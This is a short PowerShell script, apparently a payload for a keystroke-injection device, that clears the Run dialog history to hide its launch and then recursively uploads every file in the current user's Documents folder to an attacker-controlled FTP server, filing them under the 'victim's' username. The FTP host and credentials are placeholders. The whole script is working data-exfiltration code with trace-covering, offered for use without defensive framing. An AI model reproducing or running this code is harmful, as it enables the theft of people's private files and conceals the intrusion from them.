clear
#Clear Run History
remove-item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"

# Credit to dkittell - https://gist.github.com/dkittell/f029b6c7d1c46ebcffcb
# I've modified a bit of his code to create a directory with the username, I'm sure there is a better way to do this but not sure how

# FTP Server Variables - edit the xxxxx
$FTPHost = 'ftp://ftp.xxxxx.com/' + $env:username + '/'
$FTPUser = 'xxxxx'
$FTPPass = 'xxxxx'
 
#Directory where to find files to upload
$UploadFolder = "$env:userprofile\Documents\"
  
$webclient = New-Object System.Net.WebClient 
$webclient.Credentials = New-Object System.Net.NetworkCredential($FTPUser,$FTPPass)  
 
$SrcEntries = Get-ChildItem $UploadFolder -Recurse
$Srcfolders = $SrcEntries | Where-Object{$_.PSIsContainer}
$SrcFiles = $SrcEntries | Where-Object{!$_.PSIsContainer}

#Creates Folder with victims Username
try {
$makeDirectory = [System.Net.WebRequest]::Create($FTPHost);
$makeDirectory.Credentials = New-Object System.Net.NetworkCredential($FTPUser,$FTPPass);
$makeDirectory.Method = [System.Net.WebRequestMethods+FTP]::MakeDirectory;
$makeDirectory.GetResponse(); 
}
catch [Net.WebException] {}

# Create FTP Directory/SubDirectory If Needed - Start
foreach($folder in $Srcfolders)
{    
    $SrcFolderPath = $UploadFolder  -replace "\\","\\" -replace "\:","\:"   
    $DesFolder = $folder.Fullname -replace $SrcFolderPath,$FTPHost
    $DesFolder = $DesFolder -replace "\\", "/"
    # Write-Output $DesFolder
 
    try
        {
            $makeDirectory = [System.Net.WebRequest]::Create($DesFolder);
            $makeDirectory.Credentials = New-Object System.Net.NetworkCredential($FTPUser,$FTPPass);
            $makeDirectory.Method = [System.Net.WebRequestMethods+FTP]::MakeDirectory;
            $makeDirectory.GetResponse();
            #folder created successfully
        }
    catch [Net.WebException]
        {
            try {
                #if there was an error returned, check if folder already existed on server
                $checkDirectory = [System.Net.WebRequest]::Create($DesFolder);
                $checkDirectory.Credentials = New-Object System.Net.NetworkCredential($FTPUser,$FTPPass);
                $checkDirectory.Method = [System.Net.WebRequestMethods+FTP]::PrintWorkingDirectory;
                $response = $checkDirectory.GetResponse();
                #folder already exists!
            }
            catch [Net.WebException] {
                #if the folder didn't exist
            }
        }
}
# Create FTP Directory/SubDirectory If Needed - Stop
 
# Upload Files - Start
foreach($entry in $SrcFiles)
{
    $SrcFullname = $entry.fullname
    $SrcName = $entry.Name
    $SrcFilePath = $UploadFolder -replace "\\","\\" -replace "\:","\:"
    $DesFile = $SrcFullname -replace $SrcFilePath,$FTPHost
    $DesFile = $DesFile -replace "\\", "/"
    # Write-Output $DesFile
 
    $uri = New-Object System.Uri($DesFile) 
    $webclient.UploadFile($uri, $SrcFullname)
}
# Upload Files - Stop